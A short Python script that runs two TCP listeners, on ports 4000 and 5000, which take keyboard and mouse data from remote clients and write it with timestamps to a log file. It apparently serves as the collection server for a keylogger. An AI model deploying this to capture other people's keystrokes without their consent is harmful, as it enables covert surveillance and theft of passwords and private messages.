import socket
import datetime
import threading
HOST = socket.gethostbyname(socket.gethostname())
FORMAT = "utf-8"
log = open("log.txt", "a")
def keyboard_receiver():
    PORT = 4000
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        while True:
            conn, addr = s.accept()
            HOSTNAMECLIENT = conn.recv(64).decode(FORMAT)
            print(HOSTNAMECLIENT, addr)
            log.write(HOSTNAMECLIENT + " " + str(addr))
            while True:
                timenow = datetime.datetime.now()
                now = timenow.strftime("%H:%M:%S")
                try:
                    data = conn.recv(64).decode(FORMAT)
                    print(now + " " + data)
                    
                    log.write(now + " " + data + "\n")
                except ConnectionResetError:
                    break
def mouse_receiver():
    PORT = 5000
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        while True:
            conn, addr = s.accept()
            while True:
                timenow = datetime.datetime.now()
                now = timenow.strftime("%H:%M:%S")
                try:
                    data = conn.recv(64).decode(FORMAT)
                    print(now + " " + data)
                    
                    log.write(now + " " + data + "\n")
                except ConnectionResetError:
                    break

if __name__ == "__main__":
    threading.Thread(target=keyboard_receiver).start()
    mouse_receiver()
